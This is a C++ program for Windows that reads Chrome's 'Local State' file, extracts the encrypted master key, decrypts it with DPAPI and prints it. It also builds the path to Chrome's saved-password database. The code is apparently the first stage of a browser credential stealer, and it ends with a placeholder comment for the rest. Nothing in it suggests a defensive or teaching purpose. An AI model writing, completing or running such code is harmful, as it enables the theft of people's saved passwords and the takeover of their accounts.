#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <cstdlib>
#include <vector>
#include <dpapi.h>
#include <wincrypt.h>
#include "sqlite3.h"
using namespace std;

string DecryptData(const vector<unsigned char>& encryptedData) {
    DATA_BLOB encryptedBlob;
    encryptedBlob.cbData = static_cast<DWORD>(encryptedData.size());
    encryptedBlob.pbData = const_cast<BYTE*>(encryptedData.data());

    DATA_BLOB decryptedBlob;
    if (!CryptUnprotectData(&encryptedBlob, nullptr, nullptr, nullptr, nullptr, 0, &decryptedBlob)) {
        throw runtime_error("Failed to decrypt data");
    }

    string decryptedData(reinterpret_cast<const char*>(decryptedBlob.pbData), decryptedBlob.cbData);
    LocalFree(decryptedBlob.pbData);
    return decryptedData;
}

int main() {
    char* userProfile = getenv("USERPROFILE"); // Gets environment variable "%userprofile%"
    string passwordsFilePath = userProfile;
    string masterKeyPath = userProfile;

    passwordsFilePath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"; // Appends file path to "USERPROFILE"
    masterKeyPath += "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

    ifstream masterKeyFile(masterKeyPath, ios::binary);
    string masterKeyFileContent;

    if (masterKeyFile.is_open()) {
        string encodedKey;
        while (getline(masterKeyFile, masterKeyFileContent)) {
            encodedKey += masterKeyFileContent;
        }
        masterKeyFile.close();

        // Extract the encrypted key from the Local State file content
        const size_t pos = encodedKey.find("\"encrypted_key\":\"") + 17;
        encodedKey = encodedKey.substr(pos, encodedKey.find("\"", pos) - pos);

        // Decode the base64-encoded key
        string decodedKey;
        DWORD decodedSize = 0;
        CryptStringToBinaryA(encodedKey.c_str(), static_cast<DWORD>(encodedKey.size()), CRYPT_STRING_BASE64, nullptr, &decodedSize, nullptr, nullptr);
        decodedKey.resize(decodedSize);
        CryptStringToBinaryA(encodedKey.c_str(), static_cast<DWORD>(encodedKey.size()), CRYPT_STRING_BASE64, reinterpret_cast<BYTE*>(&decodedKey[0]), &decodedSize, nullptr, nullptr);

        // Decrypt the key using DPAPI
        string decryptedKey = DecryptData(vector<unsigned char>(decodedKey.begin() + 5, decodedKey.end()));

        // Use the decrypted key as needed
        cout << "Decrypted Key: " << decryptedKey << endl;
    }
    else {
        cout << "Unable to fetch Local State file." << endl;
    }

    // Rest of the code...

    return 0;
}
